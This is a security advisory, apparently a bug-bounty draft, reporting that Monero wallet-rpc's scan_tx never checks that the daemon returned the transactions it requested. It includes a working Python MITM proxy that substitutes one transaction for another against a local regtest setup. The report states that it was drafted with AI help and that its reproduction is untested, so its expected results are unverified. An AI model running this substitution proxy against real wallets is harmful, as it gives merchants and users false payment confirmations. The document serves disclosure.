# `scan_tx` wallet-rpc never verifies the daemon returned the transaction it was actually asked to scan

## Summary

`monero-wallet-rpc`'s `scan_tx` method lets an operator ask the wallet to process one or more specific transaction IDs against its currently connected daemon — a documented workflow for verifying a specific expected payment without waiting for a full refresh. The implementation, `wallet2::get_tx_entries`, sends the requested txids to the daemon's `/gettransactions` endpoint, checks that the *number* of transactions returned matches the number requested, and re-derives each returned blob's real hash — but never checks that the set of hashes actually returned is the set of hashes that was requested. A daemon that returns the right *count* of transactions, just not the right *ones*, is accepted silently.

The very same file contains the correct version of this check, used by the wallet's ordinary pool-refresh path: `read_pool_txs` cross-references every recomputed hash against the requested id set and logs an error for any that don't belong (`"Got txid ... which we did not ask for"`). `get_tx_entries`, added later for the `scan_tx` feature, does not do this.

## Severity

Monero severity: **MEDIUM** ("impacts individual wallets, must be carefully exploited").
Suggested CVSS v3.1: `4.3` with `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N`.

Rationale:
1. Requires an actively malicious, compromised, or on-path (MITM) daemon on an unencrypted or attacker-controlled connection — this is a real and commonly-occurring configuration (Monero explicitly supports and documents connecting a wallet to a third-party public remote node), but it is a stronger precondition than a pre-auth bug, hence `AC:H`.
2. No forged balance and no fund loss: output ownership for any genuinely received funds is still independently verified via view-key derivation against the real transaction blob, regardless of which hash label the daemon attaches to it.
3. Impact is a verification/integrity failure — the caller believes a specific transaction was checked when a different one was — which is exactly the failure mode `scan_tx` exists to prevent, so I'm rating integrity impact `I:L` rather than none.

## Affected Versions

Confirmed present by direct source review on:
- `v0.18.5.1` (latest tagged release, commit `4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5`)
- current `master`

## Root Cause

`wallet2::get_tx_entries`, `src/wallet/wallet2.cpp`:
```cpp
wallet2::tx_entry_data wallet2::get_tx_entries(const std::unordered_set<crypto::hash> &txids)
{
  tx_entry_data tx_entries;
  tx_entries.tx_entries.reserve(txids.size());
  ...
  for(size_t slice = 0; slice < txids.size(); slice += SLICE_SIZE) {
    cryptonote::COMMAND_RPC_GET_TRANSACTIONS::request req = AUTO_VAL_INIT(req);
    cryptonote::COMMAND_RPC_GET_TRANSACTIONS::response res = AUTO_VAL_INIT(res);
    req.decode_as_json = false;
    req.prune = true;
    ...
    for (size_t i = slice; i < slice + ntxes; ++i)
    {
      req.txs_hashes.push_back(epee::string_tools::pod_to_hex(*it));
      ++it;
    }

    {
      bool r = epee::net_utils::invoke_http_json("/gettransactions", req, res, *m_http_client, rpc_timeout);
      THROW_WALLET_EXCEPTION_IF(!r, error::wallet_internal_error, "Failed to get transaction from daemon");
      THROW_WALLET_EXCEPTION_IF(res.txs.size() != req.txs_hashes.size(), error::wallet_internal_error, "Failed to get transaction from daemon");
    }

    for (auto& tx_info : res.txs)
    {
      ...
      cryptonote::transaction tx;
      crypto::hash tx_hash;
      THROW_WALLET_EXCEPTION_IF(!get_pruned_tx(tx_info, tx, tx_hash), error::wallet_internal_error, "Failed to get transaction from daemon");
      tx_entries.tx_entries.emplace_back(process_tx_entry_t{ std::move(tx_info), std::move(tx), std::move(tx_hash) });
    }
  }
  return tx_entries;
}
```
`tx_hash` is correctly recomputed from the returned blob via `get_pruned_tx` — but it is never compared against the `txids` set that was originally requested. The only guard is `res.txs.size() != req.txs_hashes.size()`, a *count*, not an *identity*, check.

This is consumed by `scan_tx` via:
```cpp
tx_entry_data txs_to_scan = get_tx_entries(txids);
```
and the resulting `process_tx_entry_t::tx_hash` flows onward without further verification.

The correctly-implemented sibling, `read_pool_txs`, same file:
```cpp
void read_pool_txs(const cryptonote::COMMAND_RPC_GET_TRANSACTIONS::request &req, const cryptonote::COMMAND_RPC_GET_TRANSACTIONS::response &res, bool r, const std::vector<crypto::hash> &txids, std::vector<std::tuple<cryptonote::transaction, crypto::hash, bool>> &txs)
{
  if (r && res.status == CORE_RPC_STATUS_OK)
  {
    if (res.txs.size() == req.txs_hashes.size())
    {
      const std::unordered_set<crypto::hash> txid_set(txids.begin(), txids.end());
      for (const auto &tx_entry: res.txs)
      {
        if (tx_entry.in_pool)
        {
          cryptonote::transaction tx;
          crypto::hash tx_hash;
          if (get_pruned_tx(tx_entry, tx, tx_hash))
          {
            if (txid_set.count(tx_hash) > 0)
              txs.push_back(std::make_tuple(tx, tx_hash, tx_entry.double_spend_seen));
            else
              MERROR("Got txid " << tx_hash << " which we did not ask for");
          }
          ...
        }
      }
    }
  }
}
```
This is exactly the check `get_tx_entries` is missing.

## Steps to Reproduce

The setup uses a local `--regtest` daemon plus a small transparent MITM proxy sitting between a `monero-wallet-rpc` instance and that daemon, in the same style as prior accepted reports against this RPC surface. No public infrastructure or real funds are involved.

### 1. Build the release binaries

```
git clone --branch v0.18.5.1 --depth 1 https://github.com/monero-project/monero.git
cd monero && git submodule update --init --recursive
mkdir -p build/release && cd build/release
cmake -D CMAKE_BUILD_TYPE=Release -D BUILD_TESTS=OFF ../..
make -j"$(nproc)" daemon wallet-rpc
```

### 2. Start the regtest daemon and produce two distinct, real transactions

```
./bin/monerod --regtest --fixed-difficulty 1 --offline \
  --data-dir /tmp/monero-poc-scantx/chain \
  --rpc-bind-ip 127.0.0.1 --rpc-bind-port 38081 --confirm-external-bind \
  --non-interactive &

mkdir -p /tmp/monero-poc-scantx/wallets
./bin/monero-wallet-rpc --daemon-address 127.0.0.1:38081 \
  --wallet-dir /tmp/monero-poc-scantx/wallets --rpc-bind-port 38091 --disable-rpc-login \
  --non-interactive &

curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"create_wallet","params":{"filename":"w","password":"","language":"English"}}' -H 'Content-Type: application/json'
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"getaddress","params":{}}' -H 'Content-Type: application/json'
# note ADDR

curl -s http://127.0.0.1:38081/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"generateblocks","params":{"amount_of_blocks":20,"wallet_address":"ADDR"}}' -H 'Content-Type: application/json'
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"refresh","params":{}}' -H 'Content-Type: application/json'

# Produce two distinct real transactions, A (the one we will *ask about*) and B (the one the
# malicious daemon will substitute in its place)
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"transfer","params":{"destinations":[{"amount":1000000000000,"address":"ADDR"}],"account_index":0,"priority":1}}' -H 'Content-Type: application/json'
# note tx_hash as TXID_A
curl -s http://127.0.0.1:38081/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"generateblocks","params":{"amount_of_blocks":1,"wallet_address":"ADDR"}}' -H 'Content-Type: application/json'

curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"transfer","params":{"destinations":[{"amount":2000000000000,"address":"ADDR"}],"account_index":0,"priority":1}}' -H 'Content-Type: application/json'
# note tx_hash as TXID_B
curl -s http://127.0.0.1:38081/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"generateblocks","params":{"amount_of_blocks":1,"wallet_address":"ADDR"}}' -H 'Content-Type: application/json'
```

### 3. Stand up the MITM proxy that substitutes B's blob whenever A is requested

```python
#!/usr/bin/env python3
# poc_proxy_scan_tx_substitution.py
import http.server
import json
import urllib.request
import sys

REAL_DAEMON = "http://127.0.0.1:38081"
TXID_REQUESTED = sys.argv[1]   # TXID_A
TXID_SUBSTITUTE = sys.argv[2]  # TXID_B
LISTEN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 47080

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)

        if self.path == "/gettransactions":
            req = json.loads(body)
            if req.get("txs_hashes") == [TXID_REQUESTED]:
                # Ask the real daemon for the SUBSTITUTE transaction instead, but hand back
                # a response whose entry structurally satisfies get_tx_entries' only check
                # (count matches: 1 requested, 1 returned).
                fwd = dict(req)
                fwd["txs_hashes"] = [TXID_SUBSTITUTE]
                r = urllib.request.Request(REAL_DAEMON + "/gettransactions",
                                            data=json.dumps(fwd).encode(),
                                            headers={"Content-Type": "application/json"})
                resp_body = urllib.request.urlopen(r).read()
                print(f"[proxy] substituted {TXID_SUBSTITUTE} for requested {TXID_REQUESTED}")
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Connection", "close")
                self.end_headers()
                self.wfile.write(resp_body)
                return

        # default: pass through untouched
        r = urllib.request.Request(REAL_DAEMON + self.path, data=body,
                                    headers={"Content-Type": "application/json"})
        resp_body = urllib.request.urlopen(r).read()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(resp_body)

    def log_message(self, *a):
        pass

http.server.HTTPServer(("127.0.0.1", LISTEN_PORT), Handler).serve_forever()
```

```
python3 poc_proxy_scan_tx_substitution.py TXID_A TXID_B 47080 &
```

### 4. Point the wallet at the malicious proxy and call `scan_tx` for A

```
curl -s http://127.0.0.1:38091/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"set_daemon","params":{"address":"127.0.0.1:47080","trusted":true}}' -H 'Content-Type: application/json'

curl -s http://127.0.0.1:38091/json_rpc -d "{\"jsonrpc\":\"2.0\",\"id\":\"0\",\"method\":\"scan_tx\",\"params\":{\"txids\":[\"TXID_A\"]}}" -H 'Content-Type: application/json'
```

### 5. Expected result on the vulnerable build

- The proxy log shows `[proxy] substituted TXID_B for requested TXID_A`.
- `scan_tx` returns success with no indication anything was wrong, even though the transaction actually processed was B, not the requested A.
- Restoring `set_daemon` to point at the real daemon (`127.0.0.1:38081`) and calling `get_transfer_by_txid` for `TXID_A` should show no record of it having been freshly scanned via this call, despite `scan_tx` having reported success for it.

## Possible Solution

In `get_tx_entries`, build a `std::unordered_set<crypto::hash>` from the original `txids` set (as `read_pool_txs` already does) and, for every entry returned by `/gettransactions`, check that its recomputed hash is a member of that set before accepting it — logging and discarding (or failing the whole `scan_tx` call) on any mismatch, exactly mirroring `read_pool_txs`'s existing pattern in the same file.

## Impact

Anyone relying on `scan_tx` to manually verify that a *specific* expected transaction has been seen and processed — a common need for merchant tooling, exchanges, or manual payment confirmation — can be shown a false "success" by a malicious, compromised, or on-path daemon that substitutes a different, unrelated real transaction. No forged value is created (view-key-derived output ownership is unaffected), but the caller's belief about *which* transaction was checked is wrong, with no signal that anything went astray.

## Note on AI usage

Source-code analysis (locating this gap by comparing `get_tx_entries` against its correctly-implemented sibling `read_pool_txs` in the same file) and drafting of this report were done with AI assistance, working directly against the `v0.18.5.1` release source. **This has been verified by static code reading only — the reproduction steps and proxy script above have not yet been executed against a running daemon/wallet-rpc pair.** Please run them, capture the actual RPC responses and proxy log output, and attach that transcript before submitting, per this program's requirement for a working PoC with logs.
